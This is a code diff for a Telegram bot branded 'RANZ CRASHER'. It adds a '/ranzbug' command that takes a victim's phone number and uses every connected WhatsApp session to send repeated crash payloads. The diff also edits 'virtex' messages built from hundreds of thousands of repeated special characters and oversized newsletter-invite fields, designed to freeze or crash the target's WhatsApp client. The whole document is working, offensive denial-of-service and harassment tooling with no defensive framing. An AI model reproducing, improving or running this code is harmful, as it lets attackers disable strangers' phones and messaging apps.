@@ -2037,6 +2037,104 @@ bot.command("ranzv1", checkPremium, async (ctx) => {
     );
   }
 });
+bot.command("ranzbug", async (ctx) => {
+  const userId = ctx.from.id;
+
+  // Cek apakah pengguna dalam cooldown
+  if (cooldownUsers.has(userId)) {
+    const remainingTime = Math.ceil(
+      (cooldownUsers.get(userId) - Date.now()) / 1000
+    );
+    return await ctx.reply(
+      `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
+    );
+  }
+
+  // Atur cooldown 60 detik
+  const cooldownDuration = 90000;
+  cooldownUsers.set(userId, Date.now() + cooldownDuration);
+
+  setTimeout(() => {
+    cooldownUsers.delete(userId);
+  }, cooldownDuration);
+
+  // Parsing teks setelah perintah
+  const match = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!match) {
+    return ctx.reply("Gunakan format: /trashui <nomor target>");
+  }
+
+  const [targetNumber, ...messageWords] = match.split(" ");
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const target = `${formattedNumber}@s.whatsapp.net`;
+
+  try {
+    if (sessions.size === 0) {
+      return ctx.reply(
+        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect"
+      );
+    }
+
+    const statusMessage = await ctx.reply(
+      `┏━━━━━━━━━━━━━━━━━━━━━
+┃        RANZ CRASHER
+┣━━━━━━━━━━━━━━━━━━━━━
+┃ TARGET : ${formattedNumber}
+┃ TYPE : INVIOS
+┃ TOTAL NUMBER : ${sessions.size}
+┗━━━━━━━━━━━━━━━━━━━━━`
+    );
+
+    let successCount = 0;
+    let failCount = 0;
+
+    for (const [botNum, sock] of sessions.entries()) {
+      try {
+        if (!sock.user) {
+          console.log(
+            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
+          );
+          await initializeWhatsAppConnections();
+          continue;
+        }
+
+        for (let i = 0; i < 3; i++) {
+          await TagNull(sock, target);
+          await blank(sock, target);
+          await freeze(sock, target);
+          await hardui1(sock, target);
+          await hard3(sock, target);
+          await blank(sock, target);
+          await InvisiPayload(sock, target);
+        }
+        successCount++;
+      } catch (error) {
+        failCount++;
+      }
+    }
+
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      statusMessage.message_id,
+      null,
+      `  
+┏━━━━━━━━━━━━━━━━━━━━━
+┃       RANZ CRASHER
+┣━━━━━━━━━━━━━━━━━━━━━
+┃ TARGET : ${formattedNumber}
+┃ TYPE : INVIOS
+┃ SUCCESS : ${successCount}
+┃ FAILED : ${failCount}
+┃ TOTAL NUMBER : ${sessions.size}
+┗━━━━━━━━━━━━━━━━━━━━━`,
+      { parse_mode: "Markdown" }
+    );
+  } catch (error) {
+    await ctx.reply(
+      "Terjadi kesalahan saat mengirim pesan. Silakan coba lagi."
+    );
+  }
+});
 //foto
 const photoUrls = [
   "https://img86.pixhost.to/images/382/561078759_uploaded_image.jpg",
@@ -2932,7 +3030,7 @@ async function blank(sock, target) {
               hasMediaAttachment: true,
             },
             body: {
-              text: "ㅤ ㅤ" + ui + jids,
+              text: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!" + ui + jids,
             },
             footer: {
               text: "",
@@ -2991,7 +3089,7 @@ async function blank(sock, target) {
 }
 
 async function freeze(sock, target) {
-  let virtex = "ㅤㅤㅤㅤ" + "ꦾ".repeat(250000) + "@8".repeat(250000);
+  let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙵𝚁𝙴𝙴𝚉𝙴" + "ꦾ".repeat(250000) + "@8".repeat(250000);
   await sock.relayMessage(
     target,
     {
@@ -3042,7 +3140,7 @@ async function hard3(sock, target) {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: `33333333333333333@newsletter`,
-            newsletterName: "ㅤㅤㅤㅤ" + "ꦾ".repeat(120000),
+            newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊" + "ꦾ".repeat(120000),
             jpegThumbnail: "",
             caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
             inviteExpiration: Date.now() + 1814400000, // 21 hari
